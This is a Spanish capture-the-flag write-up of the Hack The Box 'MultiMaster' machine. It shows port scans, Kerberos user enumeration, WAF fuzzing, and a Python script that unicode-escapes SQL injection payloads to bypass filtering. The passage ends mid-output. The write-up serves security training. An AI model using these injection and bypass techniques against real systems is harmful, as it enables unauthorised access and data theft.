---
layout: post
title: MultiMaster
date: 2023-01-25
description: 
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Multimaster-htb/Multimaster_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección SQL avanzada

* WAF Bypassing

* Enumeración por Kerberos

* Python Scripting avanzado

* Fuerza bruta de RIDs para obtener los Usuarios del Dominio

* Password Spraying (Fallido)

* Enumeración de usuarios a través de la inyección SQL

* Password Spraying

* Explotación de vulnerabilidad en Visual Studio Code

* User Pivoting 1

* Abuso de websockets para obtener una ejecución remota de comandos

* AMSI Bypass (Manual)

* Inspección de DLL

* Information Disclosure

* Enumeración con BloodHound

* Abuso de GenericWrite para obtener un TGT

* User Pivoting 2

* Abuso del grupo Servers Operators (Escalada de Privilegios)

* Técnica de Persistencia [EXTRA]







***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.10.179 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 15:41 GMT
Initiating SYN Stealth Scan at 15:41
Scanning 10.10.10.179 [65535 ports]
Discovered open port 80/tcp on 10.10.10.179
Discovered open port 3389/tcp on 10.10.10.179
Discovered open port 135/tcp on 10.10.10.179
Discovered open port 445/tcp on 10.10.10.179
Discovered open port 139/tcp on 10.10.10.179
Discovered open port 53/tcp on 10.10.10.179
Discovered open port 49678/tcp on 10.10.10.179
Discovered open port 49694/tcp on 10.10.10.179
Discovered open port 88/tcp on 10.10.10.179
Discovered open port 49667/tcp on 10.10.10.179
Discovered open port 49674/tcp on 10.10.10.179
Increasing send delay for 10.10.10.179 from 0 to 5 due to 11 out of 29 dropped probes since last increase.
Discovered open port 3269/tcp on 10.10.10.179
Discovered open port 593/tcp on 10.10.10.179
Discovered open port 49675/tcp on 10.10.10.179
Discovered open port 5985/tcp on 10.10.10.179
Discovered open port 464/tcp on 10.10.10.179
Increasing send delay for 10.10.10.179 from 5 to 10 due to 11 out of 15 dropped probes since last increase.
Completed SYN Stealth Scan at 15:41, 39.98s elapsed (65535 total ports)
Nmap scan report for 10.10.10.179
Host is up, received user-set (0.083s latency).
Scanned at 2023-01-24 15:41:16 GMT for 40s
Not shown: 65519 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.08 seconds
           Raw packets sent: 196603 (8.651MB) | Rcvd: 26 (1.144KB)
```

### Escaneo de Servicios y Versiones de cada puerto

```null
nmap -sCV -p53,80,88,135,139,445,464,593,3269,3389,5985,49667,49674,49675,49678,49694 10.10.10.179 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 15:47 GMT
Stats: 0:02:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
Nmap scan report for 10.10.10.179
Host is up (0.12s latency).

PORT      STATE SERVICE            VERSION
53/tcp    open  domain?
80/tcp    open  http               Microsoft IIS httpd 10.0
|_http-title: MegaCorp
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2023-01-24 15:54:48Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2016 Standard 14393 microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2023-01-23T15:35:45
|_Not valid after:  2023-07-25T15:35:45
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2023-01-24T15:56:29+00:00
5985/tcp  open  wsman?
49667/tcp open  unknown
49674/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49675/tcp open  unknown
49678/tcp open  unknown
49694/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2023-01-24T07:56:31-08:00
| smb2-time: 
|   date: 2023-01-24T15:56:30
|_  start_date: 2023-01-24T15:35:51
|_clock-skew: mean: 2h07m00s, deviation: 4h00m02s, median: 6m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.85 seconds
```

Añado el dominio megacorp.local y el subdominio multimaster.megacorp.local al /etc/hosts

```null
echo '10.10.10.179 megacorp.local multimaster.megacorp.local' >> /etc/hosts
```

## Puerto 445 (SMB)

Con crackmapexec, aplico un escaneo para ver la versiones, hostname y dominio

```null
crackmapexec smb 10.10.10.179
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
```

No puedo ver los recursos compartidos sin estar autenticado

```null
smbmap -H 10.10.10.179 -u 'null'
[!] Authentication error on 10.10.10.179
```

Como el puerto 53 está abierto, puedo tramitar consultas DNS para encontrar más subdominios o nombres de usuarios. En ocasiones también se leakea la dirección IPv6

## Puerto 53

Pruebo un ataque de transferencia de zona, pero no encuentro nada

```null
dig @10.10.10.179 megacorp.local axfr

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.179 megacorp.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Enumero los servidores de correo, pero no hay nada nuevo

```null
dig @10.10.10.179 megacorp.local ms

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.179 megacorp.local ms
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 53484
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;megacorp.local.			IN	A

;; ANSWER SECTION:
megacorp.local.		600	IN	A	10.10.10.34

;; Query time: 80 msec
;; SERVER: 10.10.10.179#53(10.10.10.179) (UDP)
;; WHEN: Tue Jan 24 16:00:21 GMT 2023
;; MSG SIZE  rcvd: 59

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 55956
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;ms.				IN	A

;; Query time: 44 msec
;; SERVER: 10.10.10.179#53(10.10.10.179) (UDP)
;; WHEN: Tue Jan 24 16:00:21 GMT 2023
;; MSG SIZE  rcvd: 31
```

Y finalmente los name servers

```null
dig @10.10.10.179 megacorp.local ns
;; communications error to 10.10.10.179#53: timed out

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.179 megacorp.local ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 28902
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;megacorp.local.			IN	NS

;; ANSWER SECTION:
megacorp.local.		3600	IN	NS	multimaster.megacorp.local.

;; ADDITIONAL SECTION:
multimaster.megacorp.local. 3600 IN	A	10.10.10.179
multimaster.megacorp.local. 3600 IN	AAAA	dead:beef::245
multimaster.megacorp.local. 3600 IN	AAAA	dead:beef::11a8:f926:4fb7:981f

;; Query time: 44 msec
;; SERVER: 10.10.10.179#53(10.10.10.179) (UDP)
;; WHEN: Tue Jan 24 16:00:59 GMT 2023
;; MSG SIZE  rcvd: 141
```

El dominio ya lo tenía, pero aparece la dirección IPv6. Podría tratar de realizar otro escaneo y ver si aparecen más puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv -6 dead:beef::11a8:f926:4fb7:981f -oG openportsipv6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 16:03 GMT
Initiating SYN Stealth Scan at 16:03
Scanning dead:beef::11a8:f926:4fb7:981f [65535 ports]
Discovered open port 636/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 49675/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 49667/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 3268/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 49694/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 49678/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 49703/tcp on dead:beef::11a8:f926:4fb7:981f
Increasing send delay for dead:beef::11a8:f926:4fb7:981f from 0 to 5 due to 11 out of 20 dropped probes since last increase.
Discovered open port 9389/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 135/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 3389/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 80/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 445/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 53/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 464/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 3269/tcp on dead:beef::11a8:f926:4fb7:981f
Increasing send delay for dead:beef::11a8:f926:4fb7:981f from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Discovered open port 5985/tcp on dead:beef::11a8:f926:4fb7:981f
Discovered open port 49674/tcp on dead:beef::11a8:f926:4fb7:981f
Completed SYN Stealth Scan at 16:04, 53.29s elapsed (65535 total ports)
Nmap scan report for dead:beef::11a8:f926:4fb7:981f
Host is up, received user-set (0.082s latency).
Scanned at 2023-01-24 16:03:19 GMT for 53s
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
135/tcp   open  msrpc            syn-ack ttl 63
445/tcp   open  microsoft-ds     syn-ack ttl 63
464/tcp   open  kpasswd5         syn-ack ttl 63
636/tcp   open  ldapssl          syn-ack ttl 63
3268/tcp  open  globalcatLDAP    syn-ack ttl 63
3269/tcp  open  globalcatLDAPssl syn-ack ttl 63
3389/tcp  open  ms-wbt-server    syn-ack ttl 63
5985/tcp  open  wsman            syn-ack ttl 63
9389/tcp  open  adws             syn-ack ttl 63
49667/tcp open  unknown          syn-ack ttl 63
49674/tcp open  unknown          syn-ack ttl 63
49675/tcp open  unknown          syn-ack ttl 63
49678/tcp open  unknown          syn-ack ttl 63
49694/tcp open  unknown          syn-ack ttl 63
49703/tcp open  unknown          syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 53.37 seconds
```

Encuentra el puerto 49703 abierto, pero no tiene relevancia

## Puerto 135 (RPC)

Con rpcclient trato de enumerar los usuarios del sistema, pero no tengo acceso

```null
rpcclient -U "" 10.10.10.179 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

## Puerto 80 (HTTP)

Al abrir la página web se ve lo siguiente:

<img src="/writeups/assets/img/Multimaster-htb/1.png" alt="">

La sección Collegue Finder contiene usuarios del Directorio Activo

<img src="/writeups/assets/img/Multimaster-htb/2.png" alt="">

Creo un diccionario y los valido por Kerberos

Unicamente dos usuarios no son válidos

```null
kerbrute userenum -d megacorp.local --dc 10.10.10.179 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/24/23 - Ronnie Flathers @ropnop

2023/01/24 16:24:08 >  Using KDC(s):
2023/01/24 16:24:08 >  	10.10.10.179:88

2023/01/24 16:24:13 >  [+] VALID USERNAME:	nbourne@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	alyx@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	ckane@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	kpage@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	okent@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	aldom@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	james@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	jorden@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	ilee@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	rmartin@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	zpowers@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	sbauer@megacorp.local
2023/01/24 16:24:13 >  [+] VALID USERNAME:	zac@megacorp.local
2023/01/24 16:24:13 >  Done! Tested 15 usernames (13 valid) in 5.246 seconds

```

El panel de inicio de sesión parece no estar funcional

<img src="/writeups/assets/img/Multimaster-htb/3.png" alt="">

Guardo los usuarios válidos en otro diccionario

Intento efectuar un ASPRepRoast Attack

```null
GetNPUsers.py megacorp.local/ -no-pass -usersfile valid_users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zac doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Como todos los usuarios requieren de autenticación previa de Kerberos, no puedo solicitar ningún TGT

Pruebo a efectuar un password spraying, utilizando el mismo diccionario de usuarios y contraseñas, pero no consigo nada

Intercepto con BurpSuite la petición en la búsqueda de usuarios, para tratar de efectuar una inyección SQL

Si fuerzo a envía una comilla, me devuelve un código de estado 403

<img src="/writeups/assets/img/Multimaster-htb/4.png" alt="">

Para ver que caracteres me bloquea, aplico fuzzing

```null
wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' 'http://10.10.10.179/api/getColleagues'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000010:   415        0 L      12 W       117 Ch      "("                                                                                                                                             
000000001:   415        0 L      12 W       117 Ch      "~"                                                                                                                                             
000000011:   415        0 L      12 W       117 Ch      ")"                                                                                                                                             
000000013:   415        0 L      12 W       117 Ch      "_"                                                                                                                                             
000000016:   415        0 L      12 W       117 Ch      "{"                                                                                                                                             
000000015:   415        0 L      12 W       117 Ch      "="                                                                                                                                             
000000012:   415        0 L      12 W       117 Ch      "-"                                                                                                                                             
000000003:   415        0 L      12 W       117 Ch      "@"                                                                                                                                             
000000002:   415        0 L      12 W       117 Ch      "!"                                                                                                                                             
000000007:   415        0 L      12 W       117 Ch      "^"                                                                                                                                             
000000006:   415        0 L      12 W       117 Ch      "%"                                                                                                                                             
000000009:   415        0 L      12 W       117 Ch      "*"                                                                                                                                             
000000004:   403        29 L     92 W       1233 Ch     "#"                                                                                                                                             
000000014:   415        0 L      12 W       117 Ch      "+"                                                                                                                                             
000000005:   415        0 L      12 W       117 Ch      "$"                                                                                                                                             
000000008:   415        0 L      12 W       117 Ch      "&"                                                                                                                                             
000000030:   415        0 L      12 W       117 Ch      """                                                                                                                                             
000000031:   415        0 L      12 W       117 Ch      "<"                                                                                                                                             
000000023:   415        0 L      12 W       117 Ch      ","                                                                                                                                             
000000017:   415        0 L      12 W       117 Ch      "}"                                                                                                                                             
000000028:   415        0 L      12 W       117 Ch      ":"                                                                                                                                             
000000019:   415        0 L      12 W       117 Ch      "["                                                                                                                                             
000000026:   415        0 L      12 W       117 Ch      "?"                                                                                                                                             
000000032:   403        29 L     92 W       1233 Ch     ">"                                                                                                                                             
000000029:   403        29 L     92 W       1233 Ch     "'"                                                                                                                                             
000000027:   415        0 L      12 W       117 Ch      ";"                                                                                                                                             
000000022:   415        0 L      12 W       117 Ch      "`"                                                                                                                                             
000000024:   415        0 L      12 W       117 Ch      "."                                                                                                                                             
000000025:   415        0 L      12 W       117 Ch      "/"                                                                                                                                             
000000018:   415        0 L      12 W       117 Ch      "]"                                                                                                                                             
000000020:   403        29 L     92 W       1233 Ch     "|"                                                                                                                                             
000000021:   403        29 L     92 W       1233 Ch     "\"                                                                                                                                             

Total time: 0
Processed Requests: 32
Filtered Requests: 0
Requests/sec.: 0
```

Las respuestas que me devuelven un código de estado 403 son las que están bloqueadas porque el caracter no es válido, pero también hay un código de estado 415, que suele aparecer cuando un WAF ha rechazado la petición, por lo que tengo que tener cuidado con la fuerza bruta

Vuelvo a hacer lo mismo pero, con un tiempo de espera por cada petición

```null
 wfuzz -c -s 1 -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' 'http://10.10.10.179/api/getColleagues'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000001:   415        0 L      12 W       117 Ch      "~"                                                                                                                                             
000000002:   415        0 L      12 W       117 Ch      "!"                                                                                                                                             
000000003:   415        0 L      12 W       117 Ch      "@"                                                                                                                                             
000000004:   403        29 L     92 W       1233 Ch     "#"                                                                                                                                             
000000005:   415        0 L      12 W       117 Ch      "$"                                                                                                                                             
000000013:   415        0 L      12 W       117 Ch      "_"                                                                                                                                             
000000012:   415        0 L      12 W       117 Ch      "-"                                                                                                                                             
000000010:   415        0 L      12 W       117 Ch      "("                                                                                                                                             
000000014:   415        0 L      12 W       117 Ch      "+"                                                                                                                                             
000000011:   415        0 L      12 W       117 Ch      ")"                                                                                                                                             
000000006:   415        0 L      12 W       117 Ch      "%"                                                                                                                                             
000000007:   415        0 L      12 W       117 Ch      "^"                                                                                                                                             
000000015:   415        0 L      12 W       117 Ch      "="                                                                                                                                             
000000008:   415        0 L      12 W       117 Ch      "&"                                                                                                                                             
000000016:   415        0 L      12 W       117 Ch      "{"                                                                                                                                             
000000009:   415        0 L      12 W       117 Ch      "*"                                                                                                                                             
000000017:   415        0 L      12 W       117 Ch      "}"                                                                                                                                             
000000018:   415        0 L      12 W       117 Ch      "]"                                                                                                                                             
000000019:   415        0 L      12 W       117 Ch      "["                                                                                                                                             
000000024:   415        0 L      12 W       117 Ch      "."                                                                                                                                             
000000026:   415        0 L      12 W       117 Ch      "?"                                                                                                                                             
000000025:   415        0 L      12 W       117 Ch      "/"                                                                                                                                             
000000021:   415        0 L      12 W       117 Ch      "\"                                                                                                                                             
000000027:   415        0 L      12 W       117 Ch      ";"                                                                                                                                             
000000023:   415        0 L      12 W       117 Ch      ","                                                                                                                                             
000000028:   415        0 L      12 W       117 Ch      ":"                                                                                                                                             
000000022:   415        0 L      12 W       117 Ch      "`"                                                                                                                                             
000000020:   415        0 L      12 W       117 Ch      "|"                                                                                                                                             
000000029:   403        29 L     92 W       1233 Ch     "'"                                                                                                                                             
000000030:   415        0 L      12 W       117 Ch      """                                                                                                                                             
000000031:   403        29 L     92 W       1233 Ch     "<"                                                                                                                                             
000000032:   403        29 L     92 W       1233 Ch     ">"                                                                                                                                             

Total time: 0
Processed Requests: 32
Filtered Requests: 0
Requests/sec.: 0
```

Como sigue apareciendo ese código de estado, voy a arrastrar la cabecera del Content-Type para que no entre en conflicto. Oculto el código de estado 200 porque entonces son caracteres permitidos

```null
wfuzz -c --hc=200 -s 1 -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -H "Content-Type: application/json;charset=utf-8" -d '{"name":"FUZZ"}' 'http://10.10.10.179/api/getColleagues'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000004:   403        29 L     92 W       1233 Ch     "#"                                                                                                                                             
000000005:   403        29 L     92 W       1233 Ch     "$"                                                                                                                                             
000000006:   403        29 L     92 W       1233 Ch     "%"                                                                                                                                             
000000012:   403        29 L     92 W       1233 Ch     "-"                                                                                                                                             
000000011:   403        29 L     92 W       1233 Ch     ")"                                                                                                                                             
000000009:   403        29 L     92 W       1233 Ch     "*"                                                                                                                                             
000000013:   403        29 L     92 W       1233 Ch     "_"                                                                                                                                             
000000010:   403        29 L     92 W       1233 Ch     "("                                                                                                                                             
000000014:   403        29 L     92 W       1233 Ch     "+"                                                                                                                                             
000000007:   403        29 L     92 W       1233 Ch     "^"                                                                                                                                             
000000015:   403        29 L     92 W       1233 Ch     "="                                                                                                                                             
000000008:   403        29 L     92 W       1233 Ch     "&"                                                                                                                                             
000000016:   403        29 L     92 W       1233 Ch     "{"                                                                                                                                             
000000017:   403        29 L     92 W       1233 Ch     "}"                                                                                                                                             
000000021:   500        0 L      4 W        36 Ch       "\"                                                                                                                                             
000000029:   403        29 L     92 W       1233 Ch     "'"                                                                                                                                             
000000030:   500        0 L      4 W        36 Ch       """                                                                                                                                             

Total time: 39.58070
Processed Requests: 32
Filtered Requests: 15
Requests/sec.: 0.808474
```

Todas son típicas de inyección SQL. Además, la barra de escape devuelve un código de estado 500, por lo que podría tratar de utilizar tampers para bypassear las restricciones que están implementedas

SQLMap utiliza esta técnica. Abriendo el script /usr/share/sqlmap/tamper/charunicodeescape.py se puede ver en que consiste

```null
Notes:
        * Useful to bypass weak filtering and/or WAFs in JSON contexes

    >>> tamper('SELECT FIELD FROM TABLE')
    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
```

Está representando una sentencia en SQL pero en otro formato

Cada letra se representa en ASCII con tres barras de escape y dos ceros antes.

Con python, hay una forma de convertir una cadena de texto a hexadecimal

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(ord("S"))
'0x53'
```

Para adecuarlo a lo que me interesa, tengo que quedarme con el segundo valor (quitando el '0x') y añadiendole '\\u', con una única barra de escape es suficiente

```null
>>> print("\\u00" + hex(ord("S"))[2::])
\u0053
```

Para automatizar la inyección, creo un script en python que transforme la cadena que le pase y tramite la petición al servidor web

```null
from pwn import *
import sys, requests, pdb, signal, time, json

def def_handler(sig, frame):
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


if __name__ == '__main__':

    while True: # Mediante un bucle infinito, solicito el input que quiero transformar

        sqli = input("-> ")
        
        # Breakpoint
        pdb.set_trace()
```

Agrego un Breakpoint para asegurarme de que lo que le estoy pasando no contiene saltos de línea o está en formato bytes

```null
python3 sqli_tampers.py
-> test
> /home/rubbx/Desktop/HTB/Machines/MultiMaster/sqli_tampers.py(14)<module>()
-> while True: # Mediante un bucle infinito, solicito el input que quiero transformar
(Pdb) l
  9      signal.signal(signal.SIGINT, def_handler)
 10      
 11      
 12      if __name__ == '__main__':
 13      
 14  ->        while True: # Mediante un bucle infinito, solicito el input que quiero transformar
 15      
 16              sqli = input("-> ")
 17      
 18              # Breakpoint
 19              pdb.set_trace()
(Pdb) p sqli
'test\n'
(Pdb)  
```

Como tiene un salto de línea, se lo borro con strip

```null
(Pdb) p sqli.strip()
'test'
```

Añado una función que se encargue de hacer la petición y otra que convierta el input al formato deseado

Finalmente, quedaría de la siguiente forma

```null
from pwn import *
import sys, requests, pdb, signal, time, json

def def_handler(sig, frame):
    sys.exit(1)

# Variables globales
main_url = "http://10.10.10.179/api/getColleagues"

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)
burp = {'http': 'http://127.0.0.1:8080'}

def formatunicode(sqli):

    sqli_formated = ""

    for character in sqli: # Itero por cada caracter de la variable sqli
        
        sqli_formated += "\\u00" + hex(ord(character))[2::]

    return sqli_formated

def makeRequest(sqli_formated):

    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }

    post_data = '{"name":"%s"}' % sqli_formated

    r = requests.post(main_url, headers=headers, data=post_data)

    toprint = json.loads(r.text)

    return (json.dumps(toprint, indent=5))

if __name__ == '__main__':

    while True: # Mediante un bucle infinito, solicito el input que quiero transformar

        sqli = input("-> ")
        sqli = sqli.strip()

        formatunicode(sqli)

        sqli_formated = formatunicode(sqli)

        toprint = makeRequest(sqli_formated)

        makeRequest(sqli_formated)

        print(toprint)
```

Al ejecutarlo, si trato de efectuar un ordenamiento basado en las columnas, no me devuelve un error del que me pueda aprovechar

```null
rlwrap python3 sqli_tampers.py
-> ' order by 100-- -
null
```

Pero aunque no vea el error, si pruebo por numeros pequeños, llega un punto en el que devuelve otra informacion

```null
rlwrap python3 sqli_tampers.py
-> ' order by 7-- -
null
-> ' order by 6-- -
null
-> ' order by 5-- -
[
     {
          "id": 15,
          "name": "Alessandro Dominguez",
          "position": "Senior Web Developer",
          "email": "aldom@megacorp.htb",
          "src": "aldom.jpg"
     },
     {
          "id": 11,
          "name": "Alyx Walters",
          "position": "Automation Engineer",
          "email": "alyx@megacorp.htb",
          "src": "alyx.jpg"
     },
     {
          "id": 3,
          "name": "Christian Kane",
          "position": "Assistant Manager",
          "email": "ckane@megacorp.htb",
          "src": "ckane.jpg"
     },
     {
          "id": 7,
          "name": "Connor York",
          "position": "Web Developer",
          "email": "cyork@megacorp.htb",
          "src": "cyork.jpg"
     },
     {
          "id": 17,
          "name": "egre55",
          "position": "CEO",
          "email": "egre55@megacorp.htb",
          "src": "egre55.jpg"
     },
     {
          "id": 12,
          "name": "Ian Lee",
          "position": "Internal Auditor",
          "email": "ilee@megacorp.htb",
          "src": "ilee.jpg"
     },
     {
          "id": 6,
          "name": "James Houston",
          "position": "QA Lead",
          "email": "james@megacorp.htb",
          "src": "james.jpg"
     },
     {
          "id": 10,
          "name": "Jorden Mclean",
          "position": "Full-Stack Developer",
          "email": "jorden@megacorp.htb",
          "src": "jorden.jpg"
     },
     {
          "id": 4,
          "name": "Kimberly Page",
          "position": "Financial Analyst",
          "email": "kpage@megacorp.htb",
          "src": "kpage.jpg"
     },
     {
          "id": 16,
          "name": "MinatoTW",
          "position": "CEO",
          "email": "minato@megacorp.htb",
          "src": "minato.jpg"
     },
